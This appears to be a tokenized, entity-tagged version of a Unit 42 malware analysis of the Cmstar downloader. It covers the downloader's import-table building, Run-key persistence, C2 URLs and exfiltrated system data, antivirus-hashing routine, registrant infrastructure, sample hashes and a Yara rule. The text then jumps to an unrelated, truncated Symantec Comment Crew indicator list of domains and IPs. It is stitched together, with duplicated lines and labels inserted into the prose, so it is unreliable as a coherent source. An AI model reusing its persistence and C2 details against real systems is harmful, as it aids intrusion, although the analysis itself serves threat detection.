drop
a
custom
downloader
used
in
cyber
espionage
attacks
.
This
specific
downloader
,
Cmstar B_malware.unknown
,
is
associated
with
the
Lurid B_malware.unknown
downloader
also
known
as
'
Enfal
'
.

Cmstar B_malware.unknown
was
named
for
the
log
message
'
CM**
'
used
by
the
downloader
.

Unit
42
is
aware
of
threat
actors
using
two
toolkits
–
MNKit
and
the
Tran
Duy
Linh
toolkit
–
to
produce
malicious
documents
that
exploit
CVE-2012-0158
in
order
to
implant
Cmstar B_malware.unknown
.

The
Cmstar B_malware.unknown
downloader  I
itself
has
several
unique
and
interesting
features
,
as
well
as
substantial
infrastructure
overlap
with
other
tools
worth
discussing
.

Manual
Building
of
Import
Address
Table

The
Cmstar B_malware.unknown
downloader  I
starts
by
manually
building
its
import
address
table
(
IAT
)
,
much
like
shellcode
would;
however
,
it
uses
a
rather
unique
technique
.

Instead
of
finding
API
function
names
based
on
their
hashed
values
,
this
malware
enumerates
libraries
'
export
address
table
(
EAT
)
and
searches
for
the
name
of
the
API
function
the
payload
needs
to
load
by
using
a
character
to
offset
array
.

The
payload
pairs
several
comma-separated
lists
of
characters
with
comma-separated
lists
of
numbers
.

Each
list
of
characters
consists
of
the
set
found
within
the
API
function
name
the
payload
seeks
to
add
to
its
IAT
,
while
the
corresponding
list
of
numbers
specifies
the
offset
in
the
function
name
where
those
characters
should
be
placed
.

For
example
,
if
the
payload
has
'
D,e,A
'
paired
with
'
0,5,19
'
,
this
results
in
the
following
mapping
:
'
D
'
at
offset
0
in
API
function
name
'
e
'
at
offset
5
in
API
function
name
'
A
'
at
offset
19
in
API
function
name

The
payload
loads
a
specific
Windows
library's
EAT
by
calling
the
ImageDirectoryEntryToData
API
function
using
the
IMAGE_DIRECTORY_ENTRY_EXPORT
flag
.

It
then
enumerates
the
library's
EAT
to
find
exported
function
names
by
checking
each
function
name
for
the
character
and
the
specific
offset
.

Once
found
,
the
payload
adds
the
address
for
the
specific
API
function
to
its
IAT
.

For
instance
,
the
payload
checks
the
EAT
of
'
wininet.dll
'
using
the
comparisons
mentioned
above
to
find
the
address
to
the
'
DeleteUrlCacheEntryA
'
API
function
.
One
specific
Cmstar
payload
that
we
analyzed
used
the
character/offsets
seen
in
Figure
1
to
locate
the
API
functions
within
three
different
Windows
libraries
to
build
its
IAT
.

Library

Characters
Offsets

D,e,A
0,5,19

Function
Name

DeleteUrlCacheEntryA
wininet.dll
advapi32.dll
kernel32.dll
e,O,A
e,C,A
p,O,A
p,S,A
p,E,A
p,Q,A
e,R,e
e,C,e

S,V,A

C,s,y

O,K,A

D,K,A

D,V,A

U,r,A
v,t,S
k,A,A

W,E,c

C,M,A

U,V,e

M,O,e
3,8,12
3,8,15
3,4,15
3,4,15
3,4,14
3,4,13
3,8,15
3,8,18
3,6,13
3,6,10
3,7,12
3,9,12
3,9,14
3,6,11
3,6,12
3,6,17
0,3,6
0,10,17
0,5,14
0,7,12

InternetOpenA

InternetConnectA

HttpOpenRequestA

HttpSendRequestA

HttpEndRequestA

HttpQueryInfoA

InternetReadFile

InternetCloseHandle

RegSetValueExA

RegCloseKey

RegOpenKeyExA

RegDeleteKeyA

RegDeleteValueA

GetUserNameA

ConvertSidToStringSidA

LookupAccountNameA

WinExec

CreateFileMappingA

UnmapViewOfFile

MapViewOfFile

Figure
1
.

Character
and
Offset
Pairs
Found
in
Cmstar
Payload
and
the
Resulting
API
Function
Names

Cmstar  B_malware.unknown
Behavior

After
manually
creating
the
IAT
,
Cmstar
decrypts
its
configuration
,
several
encrypted
strings
,
and
a
piece
of
shellcode
.

The
embedded
configuration
contains
nothing
more
than
a
URL
that
Cmstar
uses
as
its
command
and
control
(
C2
)
location
.

The
encrypted
strings
within
the
Trojan  B_malware.backdoor
include
fields
used
within
the

HTTP
requests
that
Cmstar
will
create
to
communicate
with
its
C2
server
,
as
well
as
additional
strings
used
to
interact
with
the
registry
.

The
Cmstar  B_malware.unknown
sample  I
associated
with
the
MNKIT
delivery
document
creates
the
following
registry
key
to
automatically
execute
at
system
startup
:

HKCU\Software\Microsoft\Windows\CurrentVersion\Run\xpsfiltsvcs
:
'
rundll32.exe

C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\xpsfiltsvcs.dll,XpsRegisterServer
'

Unit
42
found
an
additional
encrypted
registry
key
that
would
allow
Cmstar  B_malware.unknown
to
automatically
start
up
after
reboots
.

However
,
the
code
does
not
decrypt
,
reference
,
or
use
the
following
registry
key
in
any
way
,
which
suggests
that
the
malware
author
left
this
artifact
in
the
code
after
swapping
to
the
run
key
listed
above
:

HKCU\Software\Microsoft\CTF\LangBarAddIn

Cmstar  B_malware.unknown
also
decrypts
a
752-byte
piece
of
shellcode
that
carries
out
communications
with
the
C2
server
,
specifically
by
sending
HTTP
POST
requests
to
the
following
URL
:
http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi B_url.unknown

It
should
be
noted
that
the
C2
URL
contains
the
string
'
cgl-bin
'
,
which
visually
resembles
the
common
cgibin
folder
used
by
many
webservers
to
run
server-side
scripts
.
Unit
42
used
the
Palo
Alto
Networks

AutoFocus
threat
intelligence
service
to
locate
additional
samples
using
the
'
cgl-bin
'
string
within
URLs
of

HTTP
requests
and
found
several
samples
of
the
Cmwhite B_malware.unknown
tool  I
associated
with
the
Lurid/Enfal  B_malware.unknown
downloader1
,
as
seen
in
Figure
2
.

Figure
2
.
Cmwhite B_malware.unknown
Tools I
Using
'
cgl-bin
'
within
HTTP
Requests

Cmstar's  B_malware.unknown
HTTP
POST
requests
sent
to
'
happy.launchtrue[.]com  B_url.unknown
'
contain
data
that
the
Trojan  B_malware.backdoor
gathers
from
the
infected
machine
that
has
the
following
structure
:
<Windows
Version
number>@@<CPU
Architecture
(
2
for
x64
,
1
for
x86)>??<boolean
for
elevated
privileges>]]**<boolean
if
antivirus
processes
are
found>!!<static
version
string>==

In
one
example
,
Unit
42
observed
the
following
data
within
an
analysis
environment
,
which
was
then
encrypted
using
a
single-byte
XOR
algorithm
and
a
key
of
0x45
before
being
sent
to
the
C2
server
:
510@@1??1]]**0!!150316o==

Helpfully
,
the
malware
author
writes
log
messages
to
the
'
DF64159.TMP  B_malware.unknown
'
file  I
,
used
for
debugging
purposes
throughout
the
execution
of
the
Cmstar
downloader
.

The
log
messages
are
abbreviated
strings
that
describe
specific
activities
during
the
execution
of
the
code
.

For
instance
,
the
downloader
uses
the

CreateMutex
to
create
a
mutex
named
'
{53A4988C-F91F-4054-9076-220AC5EC03F3}  B_hash
'
to
determine
if
another
instance
of
the
code
is
running
.

If
the
downloader
determines
another
instance
of
itself
is
running
,
the
code
writes
the
string
'
CM**  B_malware.unknown
'
–
which
happens
to
be
the
basis
for
the
name
of
the
Trojan  B_malware.backdoor
–
to
the
log
file
.

Unit
42
created
a
Yara
signature
to
detect
Cmstar  B_malware.unknown
samples I
based
on
these
debugging
strings
,
which
is
available
in
the
appendix
.

Hashing
Process
Names

As
mentioned
in
the
behavioral
analysis
section
,
the
Cmstar  B_malware.unknown
downloader
gathers
system-specific
information
to
send
to
the
C2
server
.

One
such
piece
of
information
is
the
existence
of
specific
running
processes
.

Many
malware
families
and
tools
check
for
the
existence
of
antivirus
,
but
the
Cmstar
tool
does
so
in
a
clever
way
.

Rather
than
including
a
list
of
strings
of
associated
processes
,
Cmstar
enumerates
the
running
processes
and
subjects
these
process
names
to
a
hashing
algorithm
.

The
results
of
this
algorithm
are
then
compared
against
three
static
values
:
0x1E00AFA B_hash
,
0xBEE091E8  B_hash
and
0xD46FCDFA  B_hash
.

Unit
42
reverse
engineered
the
algorithm
and
created
the
function
seen
below
to
generate
hashes
in
order
to
determine
the
processes
Cmstar B_malware.unknown
is
trying
to
find
:
def
hashStr(st
)
:
hash
=
0
def
hashStr(st
)
:
hash
=
0
count
=
0
while
count
<
len(st
)
:
h1
=
(
hash<<0x13)&0xFFFFFFFF
h2
=
(
hash>>0x0d)&0xFFFFFFFF
h3
=
(
h1|h2)&0xFFFFFFFF
hash
=
(
h3
+
(
ord(st[count])^0x4a))&0xFFFFFFFF
count
+=
1
return
hash

Unit
42
found
that
the
string
'
avp
'
subjected
to
the
algorithm
above
results
in
the
value
0x1E00AFA B_hash
,
which
suggests
the
Cmstar B_malware.unknown
sample
specifically
looks
for
Kaspersky's
Anti-virus
product
(
avp.exe
)
running
on
the
compromised
system
.

If
the
Trojan  B_malware.backdoor
finds
processes
whose
hash
matches
the
three
values
mentioned
earlier
,
it
sets
a
boolean
value
(
the
character
'
1
'
)
within
the
data
sent
to
the
C2
server
and
continues
carrying
out
its
functionality
.
Rather
than
altering
its
activities
,
Cmstar B_malware.unknown
only
notifies
the
C2
server
if
a
system
is
running
one
of
these
processes
,
suggesting
that
the
threat
actors
might
employ
this
technique
as
a
filtering
mechanism
to
ignore
analysis
systems
and
researchers
.

Threat
Infrastructure

In
order
to
determine
the
intrusion
set
involved
with
the
Cmstar B_malware.unknown
,
Unit
42
enumerated
infrastructure
used
by
the
downloader
for
its
C2
servers
.

The
related
infrastructure
chart
in
Figure
3
shows
a
rather
large
cluster
of
related
entities
with
one
small
set
of
entities
that
do
not
share
any
related
entities
with
the
larger
cluster
.

Figure
3
.

Infrastructure
and
Entites
Related
to
Cmstar B_malware.unknown

As
seen
in
the
chart
above
,
the
C2
domain
'
happy.launchtrue[.]com  B_url.unknown
'
was
originally
registered
using
the
email
address
'
WANGMINGHUA6@GMAIL[.]COM  B_url.unknown
'
.
When
Unit
42
used
the
Palo
Alto
Networks

AutoFocus
threat
intelligence
service
to
locate
additional
Cmstar B_malware.unknown
samples
,
we
found
several
with
C2
domains
that
also
had
the
same
original
registrant
:
links.dogsforhelp[.]com B_url.unknown
three.earewq[.]com  B_url.unknown
question.eboregi[.]com  B_url.unknown
here.pechooin[.]com B_url.unknown
sarey.phdreport[.]com B_url.unknown
bakler.featurvoice[.]com  B_url.unknown

The
only
known
Cmstar B_malware.unknown
C2
domain
not
initially
registered
by
the
email
address
was
help.ubxpi0s[.]com  B_url.unknown
.

Further
analysis
revealed
that
additional
domains
related
to
Cmstar B_malware.unknown
C2
domains
were
also
originally
registered
using
the
email
address
'
WANGMINGHUA6@GMAIL[.]COM  B_url.unknown
'
and
updated
to
the
current
information
within
a
few
days
.

In
addition
,
this
was
the
original
registrant
for
C2
domain
used
in
our

Google
Code
blog2
,
indicating
this
registrant
email
is
likely
a
re-seller
,
and/or
someone
who
initially
sets
up
infrastructure
for
particular
APT B_malware.unknown
threat
actors
.

forever.cowforhelp[.]com  B_url.unknown
question.shiesiido[.]com  B_url.unknown
endline.biortherm[.]com B_url.unknown
right.marubir[.]com B_url.unknown
baby.brabbq[.]com B_url.unknown
lind.kruptcy[.]com  B_url.unknown

The
rest
of
the
domains
related
to
the
Cmstar B_malware.unknown
infrastructure
did
not
use
the
original
registrant
noted
above
,
but
instead
kept
the
same
information
initially
used
to
register
them
.

The
difference
in
domain
registration
patterns
could
indicate
threat
actor
preference
,
or
could
indicate
there
are
at
least
two
groups
using
this
malware
whose
infrastructure
at
times
overlaps
.

under.suttgte[.]com B_url.unknown
help.ubxpi0s[.]com  B_url.unknown
finally.basiccompare[.]com  B_url.unknown
crystal.diskfunc[.]com  B_url.unknown
queenfansclub[.]com B_url.unknown
novnitie[.]com  B_url.unknown
flash-vip[.]com B_url.unknown
replyfunt[.]com B_url.unknown
natcongress[.]com B_url.unknown
keep.regebky[.]com  B_url.unknown
love.regebky[.]com  B_url.unknown

Interestingly
,
the
updated
registrant
information
(
or
original
,
in
the
cases
where
it
wasn't
changed
)
for
all
of
the
C2
domains
in
this
blog
has
also
been
used
to
register
scam
sites
,
most
purporting
to
sell
knock-off
designer
products
like
shoes
,
software
,
or
cell
phones
.

The
contact
emails
and
contact
names
can
vary
,
but
the
address
is
re-used
.
Blue
Coat
noted
this
pattern
as
well
in
a
blog
published
late
last
year
,
which
also
noted
the
'
WANGMINGHUA6@GMAIL[.]COM  B_url.unknown
'
registrant
email.3
It
is
not
known
whether
the
threat
actors
conducting
the
malicious
activity
are
also
behind
the
scam
sites
.

Conclusion

The
Cmstar B_malware.unknown
tool  I
has
several
interesting
features
,
including
a
previously
unseen
method
of
manually
creating
its
import
address
table
using
an
API
function
name
character
to
offset
mapping
techniques
,
and
a
hashing
algorithm
used
to
find
antivirus
processes
on
an
infected
system
.

Both
of
these
features
are
noteworthy
and
may
provide
the
ability
to
correlate
future
tools
to
the
same
group
and/or
malware
authors
.

The
URL
used
by
Cmstar B_malware.unknown
to
communicate
with
its
C2
server
,
as
well
as
significant
infrastructure
overlap
,
show
a
direct
relationship
between
the
Cmstar B_malware.unknown
downloader  I
,
Lurid/Enfal B_malware.unknown
and
Cmwhite B_malware.unknown
tools
.

In
a
majority
of
the
cases
,
threat
actors
using
the
Cmstar B_malware.unknown
downloader  I
initially
register
the
C2
domains
using
the
email
address
'
WANGMINGHUA6@GMAIL[.]COM  B_url.unknown
'
and
later
change
the
registration
information
to
include
a
different
email
address
.

Unit
42
cannot
positively
confirm
that
the
threat
actors
control
the
'
WANGMINGHUA6@GMAIL[.]COM  B_url.unknown
'
email
address
,
or
if
the
email
address
belongs
to
a
reseller
that
the
threat
actors
buy
domains
from
to
create
their
infrastructure;
however
,
we
do
believe
this
is
an
interesting

TTP
worth
tracking
in
future
infrastructure
enumeration
.
1
.
THE
'
LURID'DOWNLOADER
–
Nart
Villeneuve
and
David
Sancho
–
http://la.trendmicro.com/media/misc/lurid-downloader-enfal-report-en.pdf  B_url.normal
2
.
Attacks
on
East
Asia
using
Google
Code
for
Command
and
Control
–
Jen
Miller-Osborn
and
Rob

Downs
—
http://researchcenter.paloaltonetworks.com/2014/08/attacks-east-asia-using-googlecode-command-control/  B_url.normal
3
.
Linking
APTs  B_malware.unknown
from
2011
and
2014
to
an
Active
Scam
Network
–
Kiel
Wadner
–
https://www.bluecoat.com/security-blog/2014-10-08/linking-apts-2011-and-2014-active-scamnetwork B_url.normal

Appendix

Known
Cmstar B_malware.unknown
Downloaders

Filename
:
xpsfiltsvcs.tmp

SHA256
:
239a25ac2b38f0be9392ceeaeab0d64cb239f033af07ed56565ba9d6a7ddcf1f  B_hash

C2
:
links.dogsforhelp.com B_url.unknown

Filename
:
xpsfiltsvcs.tmp

SHA256
:
6b557c22ab12e8ea43d29e4f9f8a9483e3e75cd41338a674c9069b6dacdf7ba7  B_hash

C2
:
question.eboregi.com  B_url.unknown

Filename
:
xpsfiltsvcs.tmp

SHA256
:
7ade616a8f1750cecba944a02e2bce1340b18a55697b29f721ccc4701aadba6e  B_hash

C2
:
links.dogsforhelp.com B_url.unknown

Filename
:
xpsfiltsvcs.tmp

SHA256
:
88184983733f4d4fa767ad4e7993b01c5754f868470dd78ac1bad2b02c9e5001  B_hash

C2
:
here.pechooin.com B_url.unknown

Filename
:
xpsfiltsvcs.tmp

SHA256
:
b9d597aea53023727d8564e47e903b652f5e98a2c32bdc23bc4936448fb2d593  B_hash

C2
:
question.eboregi.com  B_url.unknown

Filename
:
xpsfiltsvcs.tmp

SHA256
:
e0b3cc07d3a9b509480b240368dee2a29713ea1e240674c0ccf610c84810a7c5  B_hash

C2
:
question.eboregi.com  B_url.unknown

Filename
:
xpsfiltsvcs.txt

SHA256
:
f4b8f71c0e10a345a855763e01033e2144e949c8f98c271755cc025e3f55b7da  B_hash

C2
:
three.earewq.com  B_url.unknown

Filename
:
xpsfiltsvcs.tmp

SHA256
:
2e00a98212c5a2015d12612f0d26039a0c2dfee3e1b384675f613e683f276e02  B_hash

C2
:
bakler.featurvoice.com  B_url.unknown

Filename
:
xpsfiltsvcs.dll

SHA256
:
42ed2edc37b957266ff7b02955a007dd82d955c09ef7be23e685d938e40ad61d  B_hash

C2
:
turber.xoxcobbs.com B_url.unknown

Filename
:
xpsfiltsvcs.dll

SHA256
:
9b9cc7e2a2481b0472721e6b87f1eba4faf2d419d1e2c115a91ab7e7e6fc7f7c  B_hash

C2
:
happy.launchtrue.com  B_url.unknown

Filename
:
xpsfiltsvcs.tmp

SHA256
:
a330c52b7643de9d8be51a4ae0150b7b8390dbabaea9704069694835fbd3298e  B_hash

C2
:
three.earewq.com  B_url.unknown

Filename
:
xpsfiltsvcs.tmp

SHA256
:
a8fa487d9f2152738bf49c8c69e8a147aae55c06f37c7e25026a28f21601ad7f  B_hash

C2
:
sarey.phdreport.com B_url.unknown

Filename
:
xpsfiltsvcs.tmp

SHA256
:
c99c0b37f2fd64fa523d39c35ead6416a684ae203ae728feb5feff8490eb902c  B_hash

C2
:
help.ubxpi0s.com  B_url.unknown

Filename
:
xpsfiltsvcs.tmp

SHA256
:
d541280b37dd5e2101cc5cd47b0991b8320714f5627b37646330136cddef0c23  B_hash

C2
:
three.earewq.com  B_url.unknown

Filename
:
coyote_load.dll

SHA256
:
adb05c1eecd789582886b3354b53831df9c9a06e891bb687633ee7ce21417edc  B_hash

C2
:
bakler.featurvoice.com  B_url.unknown

Delivery
Documents
Installing
Cmstar B_malware.unknown

Filename
:
Какая
реформа
армии
нужна
Украине.doc
(
What
is
needed
reform
of
the
army
Ukraine.doc
)

MD5
:
76ffb9c2d8d0ae46e8ea792ffacc8018  B_hash

SHA256
:
c26c67eac20614038aaadfda19b604862926433333893d65332928b5e36796aa  B_hash

Type
:
MIME
entity
text

Toolkit
:
MNKit

Author
:
User123

Last
Saved
By
:
User123

Created
:
2012-05-01T14:08:00Z

Modified
:
2012-05-01T14:12:00Z

Filename
:
запуск
ракеты-носителя
Союз.doc
(
launch
of
the
carrier
rocket
Soyuz.doc
)

MD5
:
6fdeadacfe1dafd2293ce5c4e178b668  B_hash

SHA256
:
e39b0e777ef0135c1f737b67988df70c2e6303c3d2b01d3cdea3efc1d03d9ad9  B_hash

Type
:
Microsoft
Office
Word
97-2003
Document

Toolkit
:
Tran
Duy
Linh

Created
:
2012:11:23
04:35:00

Modified
:
2012:11:23
04:39:00

Company
:
DLC
Corporation

Filename
:
РФ_КНР_сельское_хозяйство.doc
(
RF
China
Agriculture
and
Economy.doc
)

MD5
:
9da10a36daf845367e0fc2f3e7e54336  B_hash

SHA256
:
a0aeb172a72442d2c2c02e1d32b48accb9975c4da7742df24d9350a8ccd401f2  B_hash

Type
:
Microsoft
Office
Word
97-2003
Document

Toolkit
:
Tran
Duy
Linh

Created
:
2012:11:23
04:35:00

Modified
:
2012:11:23
04:39:00

Company
:
DLC
Corporation

Filename
:
Ерөнхий
сайд
асан
Н.Алтанхуягийг
шалгаж
эхэлжээ.doc
(
Former
Prime
Minister
started
to
check
with
their
lethargy.doc
)

MD5
:
f7d47e1de4f5f4ad530bca0fc080ea53  B_hash

SHA256
:
4883286b8229a2c43db17eb1e1c5bd79d1933e840cdfedff80d5b99a84c9e39f  B_hash

Type
:
Microsoft
Office
Word
97-2003
Document

Toolkit
:
Tran
Duy
Linh

Created
:
2012:11:23
04:35:00

Modified
:
2012:11:23
04:39:00

Company
:
DLC
Corporation

Filename
:
запуск
ракеты-носителя
Союз.doc
(
launch
of
the
carrier
rocket
Soyuz.doc
)

MD5
:
6fdeadacfe1dafd2293ce5c4e178b668  B_hash

SHA256
:
e39b0e777ef0135c1f737b67988df70c2e6303c3d2b01d3cdea3efc1d03d9ad9  B_hash

Type
:
Microsoft
Office
Word
97-2003
Document

Toolkit
:
Tran
Duy
Linh

Created
:
2012:11:23
04:35:00

Modified
:
2012:11:23
04:39:00

Company
:
DLC
Corporation

MD5
:
5aeb8a5aa8f6e2408016cbd13b3dfaf0  B_hash

SHA256
:
df34aa9c8021f1f0bdf33249908efc4a9628941453ad79b281b3a46bf9a7f37f  B_hash

Type
:
Microsoft
Office
Word
97-2003
Document

Toolkit
:
Tran
Duy
Linh

Created
:
2012:11:23
04:35:00

Modified
:
2012:11:23
04:39:00

Company
:
DLC
Corporation

Filename
:
Путины
урилга.doc
(
Putin's
invitation.doc
)

SHA256
:
45027d11ab783993c413f97e8e29759d04b04564f8916f005f5c632f291697bb  B_hash

Type
:
Microsoft
Office
Word
97-2003
Document

Toolkit
:
Tran
Duy
Linh

Created
:
2012:11:23
04:35:00

Modified
:
2012:11:23
04:39:00

Company
:
DLC
Corporation

MD5
:
46bf922d9ae07a9bc3667a374605bdbb  B_hash

SHA256
:
7dc78caf515d1d3d2b84be7c023ccbd0b4fd670a42babcbcbd5a5ba65bbdd166  B_hash

Type
:
Microsoft
Office
Word
97-2003
Document

Toolkit
:
Tran
Duy
Linh

Created
:
2012:11:23
04:35:00

Modified
:
2012:11:23
04:39:00

Company
:
DLC
Corporation

Filename
:
Армия-2015.doc
(
Army-2015.doc
)

MD5
:
783a423f5e285269126d0d98f53c795b  B_hash

SHA256
:
5b338decffe665a2141d1079c32b2d612057d1fdbfddf198cc28003dae7f0516  B_hash

Type
:
Microsoft
Office
Word
97-2003
Document

Toolkit
:
Tran
Duy
Linh

Created
:
2012:11:23
04:35:00

Modified
:
2012:11:23
04:39:00

Company
:
DLC
Corporation

Filename
:
С
днём
70
лет
победы.doc
(
Happy
70
years
of
victory.doc
)

MD5
:
510b3272342765743a202373261c08da  B_hash

SHA256
:
0a10d7bb317dceccd05d18408fd6b8b12c784910e5f7e035ee22c2c5d7e4cbf5  B_hash

Type
:
Microsoft
Office
Word
97-2003
Document

Toolkit
:
Tran
Duy
Linh

Created
:
2012:11:23
04:35:00

Modified
:
2012:11:23
04:39:00

Company
:
DLC
Corporation

Filename
:
new
resume.doc

MD5
:
c5ae7bd6aec1e01aa53edcf41962ac04  B_hash

SHA256
:
87bcc6d18c6a81d92d826b232703dee84b522bd1d0cae56f74bcf58fdca0930e  B_hash

Type
:
Microsoft
Office
Word
97-2003
Document

Toolkit
:
Tran
Duy
Linh

Created
:
2012:11:23
04:35:00

Modified
:
2012:11:23
04:39:00

Company
:
DLC
Corporation

MD5
:
3d41e3c902502c8b0ea30f5947307d56  B_hash

SHA256
:
b65dd4da9f83c11fcb5beaec43fabd0df0f7cb61de94d874f969ca926e085515  B_hash

Type
:
Microsoft
Office
Word
97-2003
Document

Toolkit
:
Tran
Duy
Linh

Created
:
2012:11:23
04:35:00

Modified
:
2012:11:23
04:39:00

Company
:
DLC
Corporation

Filename
:
Центр-2015.doc
(
Center-2015.doc
)

MD5
:
94499ff857451ab7ef8823bf067189e7  B_hash

SHA256
:
671dfc4d47a43cf0bd9205a0f654dcd5050175aef54b69388b0c5f4610896c6a  B_hash

Type
:
Microsoft
Office
Word
97-2003
Document

Toolkit
:
Tran
Duy
Linh

Created
:
2012:11:23
04:35:00

Modified
:
2012:11:23
04:39:00

Company
:
DLC
Corporation

Related
Cmwhite B_malware.unknown
Tools

MD5
:
3fff0bf6847d0d056636caef9c3056c3  B_hash

SHA256
:
13c1d7eb2fd64591e224dec9534d8252f4b91e425e8f047b36605138d15cbf2d  B_hash

C2
:
stone.timmf.com B_url.unknown

MD5
:
30a6c3c7723fe14c4b6960fa3e4e57ba  B_hash

SHA256
:
ab934c6177be0fdc3b6dfbf21f60ce7837a30e6599dcfb111b43008c75ceb91f  B_hash

C2
:
xphome.mailru-vip.com B_url.unknown

C2
:
error.yandex-pro.com  B_url.unknown

MD5
:
e0417547ba54b58bb2c8f795bca0345c  B_hash

SHA256
:
1cf44815f9eb735e095f68c929d5549e0ebc44af9988cccaf1852baeb96bb386  B_hash

C2
:
dns.thinkttun.com B_url.unknown

MD5
:
d05f012c9c1a7fb669a07070be821072  B_hash

SHA256
:
a37f337d0bc3cebede2039b0a3bd5afd0624e181d2dcc9614d2f7d816b5a7a6b  B_hash

C2
:
help.redhag.com B_url.unknown

C2
:
mssage.hotoicq.com  B_url.unknown

C2
:
new.hoticq.com  B_url.unknown

Cmstar B_malware.unknown
Yara
Rule
rule
ce_enfal_cmstar_debug_msg
rule
ce_enfal_cmstar_debug_msg
meta
:
author
=
'
rfalcone
'
description
=
'
Detects
the
static
debug
strings
within
Cmstar B_malware.unknown
'
reference
=
'
9b9cc7e2a2481b0472721e6b87f1eba4faf2d419d1e2c115a91ab7e7e6fc7f7c  B_hash
'
date
=
'
5/10/2015
'
strings
:
$d1
=
'
EEE\x0d\x0a
'
fullword
$d2
=
'
TKE\x0d\x0a
'
fullword
$d3
=
'
VPE\x0d\x0a
'
fullword
$d4
=
'
VPS\x0d\x0a
'
fullword
$d5
=
'
WFSE\x0d\x0a
'
fullword
$d6
=
'
WFSS\x0d\x0a
'
fullword
$d7
=
'
CM**\x0d\x0a
'
fullword
condition
:
uint16(0
)
==
0x5a4d
and
all
of
(
$d*
)
Comment
Crew
:
Indictors
of
Compromise

Document
Title
here

Security
Response

Comment
Crew
:

Indicators
of
Compromise

Security
Response


22
,
2013

Copyright
©
2013
Symantec

Page
1

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here

Introduction

This
document
contains
additional
Comment
Crew
indicators
of
compromise
that
were
seen
in
the
past
year
.

See
our
accompanying
blog
for
more
information
.

This
document
details
the
following
types
of
indictors
:

Network

File

System

Email

The
contents
of
this
document
are
indicators
only
and
may
match
legitimate
services
or
applications
.

Additional
verification
is
required
to
confirm
an
actual
compromise
.

Page
2

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here

Network
indicators

Network
based
indications
of
possible
compromise
by
the
comment
crew
attackers
.

HTTP
POST
traffic
containing
name=GeorgeBush&userid=<4
digit
number>&other=

HTTP
GET
traffic
to
pages
with
paths
:
aspnet_client/report.asp

Resource/device_Tr.asp
images/device_index.asp
news/media/info.html
backsangho.jpg
addCats.asp

SmartNav.jpg
nblogo2.jpg

Domains

GT446.ezua.COM  B_url.unknown
aunewsonline.com  B_url.unknown
avvmail.com B_url.unknown
cas.ibooks.tk B_url.unknown
cas.m-e.org.ru  B_url.unknown
colville.com  B_url.unknown
cvba.com  B_url.unknown
deebeedesigns.ca  B_url.unknown
dev.teamattire.com  B_url.unknown
doversolutions.co.in  B_url.unknown
download.epac.to  B_url.unknown
drgeorges.com B_url.unknown
dril-quip.deltae.com.br B_url.unknown
dsds.co.kr  B_url.unknown
[REMOVED].ruok.org  B_url.unknown
engineer.lflinkup.org B_url.unknown
exactearth.info.tm  B_url.unknown
fbrshop.com B_url.unknown
firebirdonline.com  B_url.unknown
forceoptions.net  B_url.unknown
freelanceindy.com B_url.unknown
ftp.xmahone.ocry.com  B_url.unknown
garyhart.com  B_url.unknown
gobroadreach.com  B_url.unknown
hint.happyforever.com B_url.unknown
hojutsu.com B_url.unknown
imly.org  B_url.unknown
interradiology. B_url.unknown
jimnaugle.com B_url.unknown

Page
3

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here
kayauto.net B_url.unknown
keenathomas.com B_url.unknown
ks.utworld.ch B_url.unknown

mast.zyns.com B_url.unknown

media.conci.com.au  B_url.unknown

media.finanstalk.ru B_url.unknown

media.metdf.com.au  B_url.unknown

meeting.toh.info  B_url.unknown

mountainvalley.americanunfinished.com B_url.unknown

mrswehrman.com  B_url.unknown

mwa.net B_url.unknown

woodagency.com B_url.unknown

worldnews.kickingdruging.toythieves.com B_url.unknown
news.hqrls.com  B_url.unknown
odysseus.qs-va.orbcomm.net  B_url.unknown
ohb-technology.brgh.de  B_url.unknown
omegalogos.org  B_url.unknown
pastorsrest.com B_url.unknown
portal.itsaol.com B_url.unknown
progammerli.com B_url.unknown
rbaparts.com  B_url.unknown
report.crabdance.com  B_url.unknown
[REMOVED].photo-frame.com B_url.unknown
route.cisco.ns01.info B_url.unknown
shunleewest.com B_url.unknown
slowblog.com  B_url.unknown
smilecare.com B_url.unknown
software.myftp.info B_url.unknown
soko.com  B_url.unknown
tcw.homier.com  B_url.unknown
[REMOVED]comminc.us.to  B_url.unknown
[REMOVED].arnotex.com B_url.unknown
thecrownsgolf.org B_url.unknown
[REMOVED].alfalcons.com B_url.unknown
twocirclesmusic.com B_url.unknown
un.linuxd.org B_url.unknown
update.sektori.org  B_url.unknown
us.gnpes.org  B_url.unknown
vwrm.com  B_url.unknown

Internet
protocol
addresses
140.116.70.8  B_ip.unknown
143.89.35.7 B_ip.unknown
143.89.35.7 B_ip.unknown
150.176.164.6 B_ip.unknown
202.105.39.39 B_ip.unknown
202.39.61.136 B_ip.unknown
202.6.235.83  B_ip.unknown
203.200.205.245 B_ip.unknown
204.111.73.150  B_ip.unknown

Page
4

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here
209.124.51.194  B_ip.unknown
209.124.51.219  B_ip.unknown
209.161.249.125 B_ip.unknown
209.208.114.83  B_ip.unknown
209.233.16.84 B_ip.unknown
209.253.17.229  B_ip.unknown
211.232.57.235  B_ip.unknown
212.130.19.154  B_ip.unknown
218.232.66.12 B_ip.unknown
218.233.206.2 B_ip.unknown
218.234.17.30 B_ip.unknown
24.73.192.154 B_ip.unknown
46.149.18.151 B_ip.unknown
60.248.52.95  B_ip.unknown
61.219.67.1 B_ip.unknown
63.192.38.11  B_ip.unknown
64.80.153.108 B_ip.unknown
65.105.157.228  B_ip.unknown
65.110.1.32 B_ip.unknown
65.114.195.226  B_ip.unknown
65.89.173.68  B_ip.unknown
66.151.16.30  B_ip.unknown
66.155.114.145  B_ip.unknown
66.170.3.43 B_ip.unknown
66.228.132.53 B_ip.unknown
66.228.132.8  B_ip.unknown
68.17.104.162 B_ip.unknown
68.96.31.136  B_ip.unknown
69.20.5.219 B_ip.unknown
69.25.50.10 B_ip.unknown
69.28.168.10  B_ip.unknown
69.74.43.87 B_ip.unknown
69.90.123.6 B_ip.unknown
69.90.18.22 B_ip.unknown
69.90.18.23 B_ip.unknown
70.108.241.36 B_ip.unknown
70.62.232.98  B_ip.unknown
74.86.197.56  B_ip.unknown
74.93.92.50 B_ip.unknown
78.95.63.1  B_ip.unknown

Page
5

Comment
Crew
:
Indictors
of
Compromise

Document
Title
here

File
indicators

File
based
indications
of
possible
compromise
by
the
